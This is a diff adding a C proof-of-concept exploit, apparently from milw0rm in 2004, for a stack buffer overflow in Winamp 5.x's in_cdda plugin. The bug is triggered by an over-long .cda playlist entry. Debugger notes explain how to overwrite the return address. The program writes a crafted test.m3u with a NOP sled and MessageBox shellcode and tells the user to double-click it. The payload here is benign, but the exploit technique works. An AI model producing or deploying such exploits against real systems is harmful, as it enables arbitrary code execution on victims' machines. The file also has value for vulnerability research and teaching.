@@ -1,0 +1,111 @@
+/* 
+
+Credits go to the author
+
+How to fix and study the bug:
+
+* - The cdda library only reserves 20 bytes for names when files are "*.cda"
+* - run Winamp with ollye
+* - when loaded locate and break at:
+
+10009BBB 8D4C24 20 LEA ECX,DWORD PTR SS:[ESP+20]
+10009BBF 84C0 TEST AL,AL
+10009BC1 74 0F JE SHORT in_cdda.10009BD2
+10009BC3 3C 2E CMP AL,2E
+10009BC5 74 0B JE SHORT in_cdda.10009BD2
+
+that code copies and overwrites the stack if no '.' is found in the 
+first 20 bytes of the m3u entry. Entry must not have #EXTINF data or 
+it won't resolve.
+
+* - name that entry like "C:\\1234567890abXXXX.cda" and xxxx will be your return address. 
+stack will be overwritten and exception occurs. When going out of that exception you'll be launched to padding.
+* - look for .data section of in_cdda.dll and locate the shellcode or string, and update if needed the
+field Location of shellcode (see host info). In my case it's x1002355b.
+*/
+
+
+#include <stdio.h> //File ops.
+
+//m3u File format
+//http://hanna.pyxidis.org/tech/m3u.html
+
+// Host info:
+// Name=ntdll (system)
+// File version=5.1.2600.1217 (xpsp2.030429-213)
+// Path=H:\WINDOWS\System32\ntdll.dll
+
+// Name=in_cdda
+// Base=10000000 
+// Size=00031000 (200704.)
+// Entry=1000CE1A in_cdda.<ModuleEntryPoint> 
+// Path=H:\Archivos de programa\Winamp\Plugins\in_cdda.dll
+
+#define HEADER "#EXTM3U\n"
+
+//Simple MessageBox Shellcode spanish XP Pro: xpsp2.030429-213 
+//Address of MessageBoxA in xpsp2.030429-213: 77D3b064
+char shellcode[]= 
+"C:\\1234567890ab" //Padding
+"\x5b\x35\x02\x10" //Location of shellcode : +-x10 bytes
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xB8"
+"\x75\xC1\xe4\x88" //Address of MessageBoxA + 0x11111111
+"\x2D\x11\x11\x11\x11\x50\x59\x33\xc0\x50\x68\x42\x6f"
+"\x6f\x6d\x54\x5a\x50\x50\x52\x50\x53\x51\xc3.cda\n\r";
+
+//Shellcode:
+//B8 75C1e488 MOV EAX,88e4C175 ; MessageBoxA + 0x11111111 to
+//2D 11111111 SUB EAX,11111111 ; Make characters readable
+//50 PUSH EAX ; xchg registers : eax = 77D3b064
+//59 POP ECX ; Offset to API.
+//33C0 XOR EAX,EAX ; Create Null
+//50 PUSH EAX ; Put ascii0 end of string
+//68 61616161 PUSH 6d6f6f42 ; Create string.
+//54 PUSH ESP ; Get the offset to the 
+//5A POP EDX ; Message String
+//MessageBox call
+//50 PUSH EAX ; Null Pointer
+//50 PUSH EAX ; Null Pointer
+//52 PUSH EDX ; Message
+//50 PUSH EAX ; Null Pointer
+//53 PUSH EBX ; Return address: 0x00000000
+//51 PUSH ECX ; Address of MessageBoxA
+//C3 RETN ; Jump 
+
+
+int main(int argc, char* argv[]) {
+FILE *fp;
+char *sc=(char *)malloc(sizeof(shellcode)+1);
+
+printf ("winamp 5.x m3u parsing poc - advisorie by Brett Moore\n");
+printf ("Exploit : www.k-otik.com/exploits/20041124.winampm3u.c\n");
+printf ("Simple MessageBox Shellcode spanish XP Pro: xpsp2.030429-213\n");
+printf ("Address of MessageBoxA in xpsp2.030429-213: 77D3b064\n");
+printf ("Tested on Winamp 5.02\n\n");
+
+if (sc == NULL) {
+printf ("malloc error\n");
+return -1;
+}
+
+memset(sc,'\0',sizeof(sc));
+memcpy(sc, shellcode, sizeof(shellcode) );
+
+fp = fopen ("test.m3u","w+");
+if (!fp) {
+printf (" error opening file.\n");
+return -1;
+}
+
+fwrite (HEADER, 1, strlen (HEADER), fp);
+fwrite (sc , 1, strlen(sc) , fp);
+fclose (fp);
+
+printf ("file test.m3u created. Just double click it.\n");
+return 0;
+
+}
+
+// milw0rm.com [2004-11-24]
